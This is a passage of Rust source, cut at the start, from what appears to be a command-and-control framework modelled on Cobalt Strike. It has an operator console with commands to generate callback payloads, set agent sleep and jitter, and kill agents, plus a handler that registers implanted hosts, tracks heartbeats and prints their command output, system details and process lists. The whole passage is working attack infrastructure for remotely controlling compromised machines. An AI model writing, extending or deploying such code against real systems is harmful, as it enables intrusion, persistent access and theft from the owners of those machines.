                            let parts: Vec<&str> = input.splitn(4, ' ').collect();
                            if parts.len() == 4 {
                                let agent_id = parts[1];
                                if let Ok(sleep_seconds) = parts[2].parse::<u64>() {
                                    if let Ok(jitter) = parts[3].parse::<f64>() {
                                        if let Err(e) = client.execute_sleep(agent_id, sleep_seconds, jitter).await {
                                            eprintln!("Error: {}", e);
                                        }
                                    } else {
                                        println!("Error: Invalid jitter format. Please provide a number.");
                                    }
                                } else {
                                    println!("Error: Invalid sleep duration. Please provide a number of seconds.");
                                }
                            } else {
                                println!("Usage: sleep <agent_id> <seconds> <jitter>");
                            }
                        } else if input.starts_with("generatepayload ") {
                            let parts: Vec<&str> = input.splitn(5, ' ').collect();
                            if parts.len() == 5 {
                                if let Err(e) = client.generate_payload(parts[1], parts[2], parts[3].parse::<u16>().unwrap(), parts[4]).await {
                                    eprintln!("Error: {}", e);
                                }
                            } else {
                                println!("Usage: generatepayload <output> <callback> <port> <key>");
                            }
                        } else if input.starts_with("kill ") {
                            let parts: Vec<&str> = input.splitn(2, ' ').collect();
                            if parts.len() == 2 {
                                let agent_id = parts[1];
                                if let Err(e) = client.execute_kill(agent_id).await {
                                    eprintln!("Error: {}", e);
                                }
                            } else {
                                println!("Usage: kill <agent_id>");
                            }
                        } else if input.starts_with("cleanup") {
                            client.cleanup_stale_sessions();
                        } else if !input.is_empty() {
                            println!("Unknown command: {}", input);
                            println!("Type 'help' for available commands");
                        }
                    }
                }
            }
        }
        _ => {}
    }
    
    Ok(())
}

async fn handle_connection_logic(
    mut connection: ServerConnection,
    session_manager: Arc<Mutex<SessionManager>>,
    connections: Arc<Mutex<HashMap<AgentId, mpsc::Sender<Message>>>>,
) -> Result<()> {
    // Create a channel for this connection
    let (tx, rx) = mpsc::channel::<Message>(10);
    let mut agent_id: Option<AgentId> = None;
    
    println!("🔗 WebSocket connection established");
    
    // Always insert a sender for the teamserver connection using AgentId::nil()
    {
        if let Ok(mut conns) = connections.lock() {
            use uuid::Uuid;
            conns.insert(Uuid::nil(), tx.clone());
            println!("🔗 Connection stored for teamserver (client mode)");
        } else {
            eprintln!("Failed to acquire connections lock");
        }
    }

    let mut rx = rx;
    loop {
        tokio::select! {
            // Outgoing messages from client to teamserver
            maybe_msg = rx.recv() => {
                if let Some(message) = maybe_msg {
                    if let Err(e) = connection.send_message(&message).await {
                        eprintln!("Failed to send message to teamserver: {}", e);
                    }
                } else {
                    // Channel closed
                    break;
                }
            }
            // Incoming messages from teamserver
            incoming = connection.receive_message() => {
                match incoming {
                    Ok(Some(message)) => {
                        println!("[DEBUG] Client received message: {:?}", message);
                        match message {
                            Message::Register { agent_info } => {
                                println!("✅ Agent registered: {} ({})", agent_info.hostname, agent_info.id);
                                let session = Session {
                                    agent_id: agent_info.id,
                                    agent_info: agent_info.clone(),
                                    last_heartbeat: Utc::now(),
                                    status: AgentStatus::Online,
                                    pending_commands: HashMap::new(),
                                    sleep_duration: None,
                                    sleep_jitter: None,
                                };
                                connection.set_agent_id(agent_info.id);
                                agent_id = Some(agent_info.id);
                                // Store the connection
                                {
                                    if let Ok(mut conns) = connections.lock() {
                                    conns.insert(agent_info.id, tx.clone());
                                    println!("🔗 Connection stored for agent: {}", agent_info.id);
                                    } else {
                                        eprintln!("Failed to acquire connections lock");
                                    }
                                }
                                {
                                    if let Ok(mut sm) = session_manager.lock() {
                                    sm.add_session(agent_info.id, session);
                                    println!("📋 Session added for agent: {}", agent_info.id);
                                    let session_count = sm.get_all_sessions().len();
                                    println!("📊 Total sessions: {}", session_count);
                                    } else {
                                        eprintln!("Failed to acquire session manager lock");
                                    }
                                }
                                // Write sessions to file for list command
                                {
                                    let session_data: Vec<(String, String, String, String, Option<u64>, Option<u8>)> = vec![
                                        (
                                            agent_info.id.to_string(),
                                            agent_info.hostname.clone(),
                                            agent_info.ip_address.clone(),
                                            format!("{:?}", AgentStatus::Online),
                                            None,
                                            None
                                        )
                                    ];
                                    if let Ok(json) = serde_json::to_string(&session_data) {
                                        let _ = std::fs::write("sessions.json", json);
                                    }
                                }
                            }
                            Message::Heartbeat { agent_id, timestamp: _ } => {
                                println!("💓 Heartbeat from agent: {}", agent_id);
                                {
                                    if let Ok(mut sm) = session_manager.lock() {
                                    if let Err(e) = sm.update_heartbeat(&agent_id) {
                                        eprintln!("❌ Failed to update heartbeat: {}", e);
                                    } else {
                                        println!("✅ Heartbeat updated for agent: {}", agent_id);
                                        }
                                    } else {
                                        eprintln!("Failed to acquire session manager lock for heartbeat");
                                    }
                                }
                            }
                            Message::Response { command_id: _, ref response } => {
                                println!("[DEBUG] Client received Response message: {:?}", response);
                                
                                // Handle response for both agent connections and client connections
                                let agent_id = connection.get_agent_id();
                                if let Some(agent_id) = agent_id {
                                    println!("📤 Response from agent {}: {:?}", agent_id, response);
                                } else {
                                    println!("📤 Response received (client connection): {:?}", response);
                                }
                                
                                // Format the response like Cobalt Strike
                                match response {
                                        CommandResponse::Success { output, exit_code } => {
                                            println!("\n[*] Tasked agent to execute command");
                                            println!("[*] Agent {:?} returned results:", agent_id);
                                            println!("{}", "=".repeat(60));
                                            if !output.trim().is_empty() {
                                                println!("{}", output.trim());
                                            } else {
                                                println!("(no output)");
                                            }
                                            println!("{}", "=".repeat(60));
                                            println!("[*] Command completed with exit code: {}", exit_code);
                                        }
                                        CommandResponse::Error { error, exit_code } => {
                                            println!("\n[!] Tasked agent to execute command");
                                            println!("[!] Agent {:?} returned error:", agent_id);
                                            println!("{}", "=".repeat(60));
                                            println!("ERROR: {}", error);
                                            println!("{}", "=".repeat(60));
                                            println!("[!] Command failed with exit code: {}", exit_code);
                                        }
                                        CommandResponse::SystemInfo(sysinfo) => {
                                            println!("\n[*] Tasked agent to get system information");
                                            println!("[*] Agent {:?} returned system info:", agent_id);
                                            println!("{}", "=".repeat(60));
                                            println!("Hostname: {}", sysinfo.hostname);
                                            println!("Username: {}", sysinfo.username);
                                            println!("OS: {}", sysinfo.os);
                                            println!("Architecture: {}", sysinfo.architecture);
                                            println!("Uptime: {} seconds", sysinfo.uptime);
                                            println!("Memory: {} / {} MB", sysinfo.memory_used, sysinfo.memory_total);
                                            println!("CPU Count: {}", sysinfo.cpu_count);
                                            println!("IP Addresses: {}", sysinfo.ip_addresses.join(", "));
                                            println!("MAC Addresses: {}", sysinfo.mac_addresses.join(", "));
                                            println!("{}", "=".repeat(60));
                                        }
                                        CommandResponse::ProcessList(processes) => {
                                            println!("\n[*] Tasked agent to get process list");
                                            println!("[*] Agent {:?} returned {} processes:", agent_id, processes.len());
                                            println!("{}", "=".repeat(80));
                                            println!("{:<8} {:<20} {:<30} {:<10} {:<10}", "PID", "Name", "Command", "Memory(MB)", "CPU(%)");
                                            println!("{}", "-".repeat(80));
                                            for process in processes.iter().take(20) { // Limit to first 20 processes
                                                println!("{:<8} {:<20} {:<30} {:<10} {:<10.1}", 
                                                    process.pid,
                                                    if process.name.len() > 19 { &process.name[..19] } else { &process.name },
                                                    if process.command.len() > 29 { &process.command[..29] } else { &process.command },
                                                    process.memory_usage / 1024 / 1024,
                                                    process.cpu_usage
                                                );
                                            }
                                            if processes.len() > 20 {
                                                println!("... and {} more processes", processes.len() - 20);
                                            }
                                            println!("{}", "=".repeat(80));
                                        }
                                    }
                                },
                            Message::ListAgentsResponse { agents } => {
                                println!("[*] Listing connected agents...");
                                println!("[*] Total online agents: {}", agents.len());
                                if agents.is_empty() {
                                    println!("[!] No agents connected");
                                } else {
                                    println!("{}", "=".repeat(100));
                                    println!("{:<36} {:<20} {:<15} {:<10} {:<12} {:<8} {:<10}",
                                        "Agent ID", "Hostname", "IP Address", "Status", "Sleep(ms)", "Jitter", "Note");
                                    println!("{}", "=".repeat(100));
                                    for agent_extended in agents {
                                        let agent = &agent_extended.agent_info;
                                        let sleep_duration = agent_extended.sleep_duration.map_or("-".to_string(), |d| d.to_string());
                                        let sleep_jitter = agent_extended.sleep_jitter.map_or("-".to_string(), |j| j.to_string());
                                        println!("{:<36} {:<20} {:<15} {:<10} {:<12} {:<8} {:<10}",
                                            agent.id, agent.hostname, agent.ip_address, "Online", sleep_duration, sleep_jitter, "");
                                    }
                                    println!("{}", "=".repeat(100));
                                }
                            }
                            _ => {
                                println!("📨 Received message: {:?}", message);
                            }
                        }
                    }
                    Ok(None) => {
                        println!("Connection closed by teamserver");
                        break;
                    }
                    Err(e) => {
                        eprintln!("Error receiving message: {}", e);
                        break;
                    }
                }
            }
        }
    }
    
    // Clean up on disconnect
    if let Some(id) = agent_id {
        {
            if let Ok(mut connections) = connections.lock() {
            connections.remove(&id);
            } else {
                eprintln!("Failed to acquire connections lock for cleanup");
            }
        }
        {
            if let Ok(mut sm) = session_manager.lock() {
            if let Some(session) = sm.get_session_mut(&id) {
                session.status = AgentStatus::Offline;
                }
            } else {
                eprintln!("Failed to acquire session manager lock for cleanup");
            }
        }
        println!("🔌 Agent {} disconnected", id);
    }
    
    Ok(())
} 
